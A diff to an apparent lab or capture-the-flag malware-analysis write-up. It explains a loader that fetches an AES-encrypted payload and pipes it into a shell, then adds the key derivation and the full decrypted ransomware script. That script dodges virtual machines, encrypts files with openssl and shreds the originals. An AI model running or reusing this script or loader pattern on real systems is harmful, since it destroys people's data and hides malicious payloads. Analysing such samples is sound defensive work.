@@ -128,11 +128,11 @@ printf 'Ваши файлы зашифрованы, для расшифровк�
 
 This is the ransomware loader.
 
-First, it takes an existing secret in $AES_KEY (in the `downloader.sh`), hashes it with SHA-256, and splits the hexadecimal hash into:
-- KEY: 16 bytes for AES-128
-- IV: 16-byte initialization vector
+First, it takes an existing secret in $AES_KEY (in the `downloader.sh`), hashes it with SHA-256 for the SEED, and splits the hexadecimal hash into two parts KEY and IV
+- KEY: first 16 bytes for AES-128
+- IV: last 16-byte initialization vector
 
-Secondly, it builds another value from the current username and hostname, exporting KEY_R and IV_R. The downloaded payload may use these to identify the victim or encrypt data uniquely per machine.
+Moreover, it builds another value from the current username and hostname, exporting KEY_R and IV_R. The downloaded payload may use these to identify the victim or encrypt data uniquely per machine.
 
 Then, it silently downloads `ransom.sh` from Codeberg, treats it as hex-encoded data, converts it back to bytes, decrypts it using AES-128-CBC, and pipes the resulting plaintext directly into the shell for execution. The pipeline can be briefed as `curl --> xxd --> openssl decrypt --> sh`. This mean that the actual malicious logic is hidden remotely and encrypted until execution. The author can also change that remote payload at their disposal.
 
@@ -152,6 +152,54 @@ Finally, silences all output/errors of the installment of the ransomware with `>
 
 This is our malware, encrypted with AES. To understand how it really works, we need to decipher it first using the logic above.
 
+We are provided with:
 
+`AES_KEY = "nowsyourchancetobeabigshot"`
 
+Compute the SHA256 of this value to get `SEED`:
 
+`SEED = 486fd2365fa54a6884f4e8dc363d01584e221c81c4123e2021105b19cede1319`
+
+Then splits the 64 hexadecimal characters into two parts: KEY and IV
+
+- Key = Character 1 to 32 = `486fd2365fa54a6884f4e8dc363d0158` (AES-128)
+- IV = Character 33 to 64 = `4e221c81c4123e2021105b19cede1319` (CBC)
+
+Configurate the input as HEX and the output as RAW.
+
+<img width="959" height="449" alt="image" src="https://github.com/user-attachments/assets/3fed0304-d5b5-4e8c-975f-16f529fe3bee" />
+
+We can now retrieve our ransomware shell script:
+
+```
+#!/usr/bin/env sh
+
+fail() {
+	echo "There is no free minecrap"
+	exit
+}
+
+if grep -qE '^(flags|Features).*hypervisor' /proc/cpuinfo 2>/dev/null; then
+	:
+else
+	# 2. DMI vendor / product name
+	for f in \
+		/sys/class/dmi/id/sys_vendor \
+		/sys/class/dmi/id/product_name \
+		/sys/class/dmi/id/board_vendor
+	do
+		[ -r "$f" ] || continue
+		case "$(cat "$f")" in
+			*QEMU*|*KVM*|*VMware*|*VirtualBox*|*Xen*|*Microsoft*)
+				exit 0
+				;;
+		esac
+	done
+	fail
+fi
+
+find . -path '*/.*' -prune -o ! -name '*.naoyacrypted' -type f -print | while IFS= read -r i; do
+	openssl aes-128-cbc -e -in "$i" -K "$KEY_R" -iv "$IV_R" | xxd -p > "$i.naoyacrypted"
+	shred -zu "$i"
+done
+```
